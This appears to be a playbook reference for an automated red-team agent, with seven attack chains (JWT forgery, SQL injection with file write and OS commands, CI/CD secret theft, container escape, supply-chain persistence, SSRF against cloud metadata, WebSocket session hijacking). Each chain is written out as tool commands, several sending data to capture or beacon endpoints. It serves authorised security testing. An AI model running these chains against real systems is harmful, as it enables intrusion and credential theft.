# Attack Scenarios Reference

**GRIMSEC Agent 12 — Pre-Built Attack Playbooks**

This reference contains pre-built adversary simulation playbooks organized by vulnerability class. Each scenario maps to MITRE ATT&CK techniques and specifies the exact RedAmon commands to execute.

> These playbooks require an active signed RoE (`adversary-simulation/roe.json`) before execution.

---

## Scenario 1: Hardcoded Credential Exploitation

**Chain**: JWT Forgery → API Access → Data Exfiltration  
**GRIMSEC Trigger**: `EXPLOITABLE` findings with `vuln_type: JWT` or `vuln_type: CREDENTIAL`

### ATT&CK Chain

| Step | Tactic | Technique | ID |
|------|--------|-----------|-----|
| 1 | Credential Access | Unsecured Credentials | T1552 |
| 2 | Credential Access | Steal Web Session Cookie | T1539 |
| 3 | Initial Access | Exploit Public-Facing Application | T1190 |
| 4 | Collection | Data from Information Repositories | T1213 |

### Playbook

**Step 1 — Locate hardcoded credentials in codebase**
```bash
# This step uses static analysis output from devsecops-repo-analyzer
# Check code-understanding/context-map.json for hardcoded secrets
cat code-understanding/context-map.json | jq '.hardcoded_secrets[]'

# Run additional JS recon to find secrets in client-side bundles
./redamon.sh recon --target <domain> --mode js-recon --extract-secrets \
  --output recon/secrets-found.json
```

**Step 2 — JWT algorithm confusion (None/HS256→RS256)**
```bash
./redamon.sh exploit \
  --module custom-payload \
  --vuln-type JWT \
  --target <api-host> \
  --endpoint /api/v1/auth/me \
  --payload-template references/payloads/jwt-none-alg.json \
  --output exploitation-log/jwt-forgery.json

# If RS256 public key is accessible:
./redamon.sh exploit \
  --module custom-payload \
  --vuln-type JWT \
  --target <api-host> \
  --endpoint /.well-known/jwks.json \
  --payload-template references/payloads/jwt-rs256-to-hs256.json \
  --output exploitation-log/jwt-key-confusion.json
```

**Step 3 — Authenticated API access as admin**
```bash
# Use forged JWT to access admin endpoints
./redamon.sh exploit \
  --module custom-payload \
  --vuln-type IDOR \
  --target <api-host> \
  --endpoint /api/v1/admin/users \
  --auth-token "$(cat exploitation-log/jwt-forgery.json | jq -r '.forged_token')" \
  --output exploitation-log/admin-access.json
```

**Step 4 — Data access demonstration (metadata only)**
```bash
./redamon.sh post-exploit \
  --mode data-enumeration \
  --compromised-host <api-host> \
  --auth-token "$(cat exploitation-log/jwt-forgery.json | jq -r '.forged_token')" \
  --metadata-only \
  --output post-exploit/data-access.json
```

**Evidence to capture**: Forged JWT token, server response showing admin access, list of accessible data assets (metadata only).

---

## Scenario 2: SQL Injection Chain

**Chain**: Injection → Data Extraction → Privilege Escalation  
**GRIMSEC Trigger**: `EXPLOITABLE` findings with `vuln_type: SQLI`

### ATT&CK Chain

| Step | Tactic | Technique | ID |
|------|--------|-----------|-----|
| 1 | Initial Access | Exploit Public-Facing Application | T1190 |
| 2 | Collection | Data from Local System | T1005 |
| 3 | Credential Access | Unsecured Credentials | T1552 |
| 4 | Privilege Escalation | Exploitation for Privilege Escalation | T1068 |

### Playbook

**Step 1 — Confirm injection point**
```bash
# Detection run (no exploitation)
./redamon.sh exploit --module sqlmap \
  --url "http://<target>/endpoint?param=test" \
  --level 1 --risk 1 --batch --detect-only \
  --output exploitation-log/sqli-detection.json
```

**Step 2 — Extract database structure**
```bash
./redamon.sh exploit --module sqlmap \
  --url "http://<target>/endpoint?param=test" \
  --level 3 --risk 2 --batch \
  --dbs \
  --output exploitation-log/sqli-dbs.json
```

**Step 3 — Extract credential table**
```bash
# Target users/credentials table (metadata only — do NOT dump production PII)
./redamon.sh exploit --module sqlmap \
  --url "http://<target>/endpoint?param=test" \
  --level 3 --risk 2 --batch \
  --tables -D <database> \
  --output exploitation-log/sqli-tables.json

# Extract schema only (column names, types) — NOT actual row data
./redamon.sh exploit --module sqlmap \
  --url "http://<target>/endpoint?param=test" \
  --level 3 --risk 2 --batch \
  --columns -T users -D <database> \
  --output exploitation-log/sqli-schema.json
```

**Step 4 — Privilege escalation via INTO OUTFILE / xp_cmdshell**
```bash
# MySQL: test INTO OUTFILE write capability
./redamon.sh exploit --module sqlmap \
  --url "http://<target>/endpoint?param=test" \
  --level 5 --risk 3 --batch \
  --file-write /tmp/grimsec-test.txt \
  --file-dest /var/www/html/grimsec-test.txt \
  --output exploitation-log/sqli-filewrite.json

# MSSQL: test xp_cmdshell (if enabled)
./redamon.sh exploit --module sqlmap \
  --url "http://<target>/endpoint?param=test" \
  --os-cmd "whoami" \
  --batch \
  --output exploitation-log/sqli-rce.json
```

**Evidence**: SQLMap output logs, database names, table schema (not data), OS command output if applicable.

---

## Scenario 3: CI/CD Pipeline Poisoning

**Chain**: PR Injection → Workflow Execution → Secret Theft  
**GRIMSEC Trigger**: `EXPLOITABLE` findings with `vuln_type: CICD_INJECTION` or exposed runner tokens

### ATT&CK Chain

| Step | Tactic | Technique | ID |
|------|--------|-----------|-----|
| 1 | Initial Access | Supply Chain Compromise | T1195 |
| 2 | Execution | Command and Scripting Interpreter | T1059 |
| 3 | Credential Access | Unsecured Credentials | T1552 |
| 4 | Exfiltration | Exfiltration Over Alternative Protocol | T1048 |

### Playbook

**Step 1 — Identify vulnerable workflow triggers**
```bash
# Scan repository for pull_request_target or workflow_run triggers
grep -r "pull_request_target\|workflow_run" .github/workflows/ \
  --include="*.yml" --include="*.yaml" -l

# Check for environment variable injection in workflow steps
./redamon.sh scan \
  --mode cicd-analysis \
  --target .github/workflows/ \
  --output recon/cicd-analysis.json
```

**Step 2 — Construct malicious workflow payload**
```bash
# RedAmon generates a proof-of-concept workflow
# that exfiltrates to a controlled endpoint (not production)
./redamon.sh exploit \
  --module custom-payload \
  --vuln-type CICD_INJECTION \
  --target github.com/<org>/<repo> \
  --payload-template references/payloads/cicd-poc-exfil.yml \
  --controlled-endpoint https://grimsec-lab.internal/capture \
  --output exploitation-log/cicd-poc.json

# NOTE: Only create a draft PR in an authorized test fork — never against production repos
```

**Step 3 — Demonstrate secret access**
```bash
# Verify which secrets would be accessible in the poisoned workflow context
./redamon.sh exploit \
  --module custom-payload \
  --vuln-type CICD_INJECTION \
  --mode secret-enumeration \
  --target github.com/<org>/<repo> \
  --output exploitation-log/cicd-secrets.json
```

**Evidence**: Workflow YAML analysis, list of accessible secrets (names only), PoC PR diff.

---

## Scenario 4: Container Escape

**Chain**: Root Container → Host Access → Lateral Movement  
**GRIMSEC Trigger**: `EXPLOITABLE` findings with `vuln_type: CONTAINER_ESCAPE` or privileged container detected

### ATT&CK Chain

| Step | Tactic | Technique | ID |
|------|--------|-----------|-----|
| 1 | Initial Access | Exploit Public-Facing Application | T1190 |
| 2 | Privilege Escalation | Escape to Host | T1611 |
| 3 | Lateral Movement | Remote Services | T1021 |
| 4 | Persistence | Create Account | T1136 |

### Playbook

**Step 1 — Identify escape vectors**
```bash
./redamon.sh exploit \
  --module container-escape \
  --target <container-host> \
  --check-only \
  --output exploitation-log/container-vectors.json

# Checks for:
# - /var/run/docker.sock mount
# - Privileged flag (--privileged)
# - CAP_SYS_ADMIN, CAP_NET_ADMIN capabilities
# - Host path volume mounts (/host, /proc, /sys)
# - Writable /proc/sys/kernel/core_pattern
```

**Step 2 — Execute escape via Docker socket**
```bash
# ⚠️ REQUIRES HUMAN APPROVAL — escalates to host-level access
./redamon.sh exploit \
  --module container-escape \
  --method docker-socket \
  --target <container-host> \
  --output exploitation-log/container-escape.json

# Alternative: privileged container + /proc/sysrq-trigger
./redamon.sh exploit \
  --module container-escape \
  --method sysrq \
  --target <container-host> \
  --output exploitation-log/container-escape-sysrq.json
```

**Step 3 — Demonstrate host lateral movement**
```bash
./redamon.sh post-exploit \
  --mode lateral-movement \
  --compromised-host <host-ip> \
  --network-map recon/ports.json \
  --output post-exploit/lateral-movement.json
```

**Evidence**: Docker socket path, container capabilities dump, host filesystem listing (limited), reachable internal hosts.

---

## Scenario 5: Supply Chain Attack

**Chain**: Compromised Dependency → Code Execution → Persistence  
**GRIMSEC Trigger**: `EXPLOITABLE` findings with `vuln_type: SUPPLY_CHAIN`

### ATT&CK Chain

| Step | Tactic | Technique | ID |
|------|--------|-----------|-----|
| 1 | Initial Access | Supply Chain Compromise | T1195 |
| 2 | Execution | Command and Scripting Interpreter | T1059 |
| 3 | Persistence | Valid Accounts | T1078 |

### Playbook

**Step 1 — Identify vulnerable/typosquatted dependencies**
```bash
./redamon.sh exploit \
  --module dependency-hijack \
  --target recon/tech-stack.json \
  --check-typosquatting \
  --check-abandoned \
  --check-malicious \
  --output exploitation-log/supply-chain-scan.json
```

**Step 2 — Analyze install hook execution**
```bash
# Check if malicious package would execute during npm install / pip install
./redamon.sh exploit \
  --module dependency-hijack \
  --mode install-hook-analysis \
  --package <package-name> \
  --output exploitation-log/install-hook.json
```

**Step 3 — Simulate persistence via installed hook**
```bash
# PoC: demonstrate what persistent access would look like
./redamon.sh exploit \
  --module custom-payload \
  --vuln-type SUPPLY_CHAIN \
  --mode persistence-poc \
  --target <host> \
  --controlled-endpoint https://grimsec-lab.internal/beacon \
  --output exploitation-log/supply-chain-persistence.json
```

---

## Scenario 6: SSRF Chain

**Chain**: SSRF → Internal Service Access → Credential Theft  
**GRIMSEC Trigger**: `EXPLOITABLE` findings with `vuln_type: SSRF`

### ATT&CK Chain

| Step | Tactic | Technique | ID |
|------|--------|-----------|-----|
| 1 | Initial Access | Exploit Public-Facing Application | T1190 |
| 2 | Lateral Movement | Exploitation of Remote Services | T1210 |
| 3 | Credential Access | Unsecured Credentials | T1552 |

### Playbook

**Step 1 — Confirm SSRF with out-of-band detection**
```bash
./redamon.sh exploit \
  --module custom-payload \
  --vuln-type SSRF \
  --target <host> \
  --endpoint <endpoint> \
  --payload-template references/payloads/ssrf-oob-detection.json \
  --oob-server https://grimsec-lab.internal/oob \
  --output exploitation-log/ssrf-detection.json
```

**Step 2 — Enumerate internal services**
```bash
./redamon.sh exploit \
  --module custom-payload \
  --vuln-type SSRF \
  --target <host> \
  --endpoint <endpoint> \
  --payload-template references/payloads/ssrf-internal-scan.json \
  --internal-cidr 10.0.0.0/24,172.16.0.0/12 \
  --output exploitation-log/ssrf-internal-scan.json
```

**Step 3 — AWS IMDSv1 credential extraction (if cloud environment)**
```bash
./redamon.sh exploit \
  --module custom-payload \
  --vuln-type SSRF \
  --target <host> \
  --endpoint <endpoint> \
  --payload-template references/payloads/ssrf-aws-metadata.json \
  --output exploitation-log/ssrf-imds.json

# Fetches: http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Evidence: IAM role name (NOT the actual credentials — metadata only)
```

---

## Scenario 7: WebSocket Hijacking

**Chain**: CSWSH → Session Theft → Authenticated Actions  
**GRIMSEC Trigger**: `EXPLOITABLE` findings with `vuln_type: WEBSOCKET`

### ATT&CK Chain

| Step | Tactic | Technique | ID |
|------|--------|-----------|-----|
| 1 | Credential Access | Steal Web Session Cookie | T1539 |
| 2 | Execution | Exploitation for Client Execution | T1203 |
| 3 | Collection | Data from Information Repositories | T1213 |

### Playbook

**Step 1 — Confirm CSWSH vulnerability (missing Origin validation)**
```bash
./redamon.sh exploit \
  --module custom-payload \
  --vuln-type WEBSOCKET \
  --target <ws-host> \
  --endpoint <ws-endpoint> \
  --payload-template references/payloads/cswsh-payload.html \
  --output exploitation-log/websocket-detection.json
```

**Step 2 — Deploy CSWSH PoC page**
```bash
# Generates a static HTML page that hijacks WebSocket connection
# from victim's browser (requires social engineering in real attack)
./redamon.sh exploit \
  --module custom-payload \
  --vuln-type WEBSOCKET \
  --mode generate-poc \
  --target ws://<ws-host><ws-endpoint> \
  --capture-endpoint https://grimsec-lab.internal/ws-capture \
  --output exploitation-log/cswsh-poc.html
```

**Step 3 — Demonstrate session-level authenticated access**
```bash
# Replay captured session tokens to demonstrate impact
./redamon.sh exploit \
  --module custom-payload \
  --vuln-type WEBSOCKET \
  --mode session-replay \
  --session-token "$(cat exploitation-log/cswsh-capture.json | jq -r '.captured_cookie')" \
  --target <ws-host> \
  --endpoint <ws-endpoint> \
  --output exploitation-log/websocket-replay.json
```

---

## Scenario Selection Logic

When `run-simulation.py` processes EXPLOITABLE findings, it selects scenarios using this priority:

```python
SCENARIO_MAP = {
    "JWT":              "scenario-1",  # Hardcoded credential / JWT
    "CREDENTIAL":       "scenario-1",
    "SQLI":             "scenario-2",  # SQL injection
    "CICD_INJECTION":   "scenario-3",  # CI/CD poisoning
    "CONTAINER_ESCAPE": "scenario-4",  # Container escape
    "SUPPLY_CHAIN":     "scenario-5",  # Supply chain
    "SSRF":             "scenario-6",  # SSRF chain
    "WEBSOCKET":        "scenario-7",  # WebSocket hijacking
    "CVE":              "auto",        # Auto-select via Metasploit
    "RCE":              "auto",
    "XSS":              "nuclei",
}
```

If multiple EXPLOITABLE findings of the same type exist, they are chained together within the scenario to build the longest possible attack path.
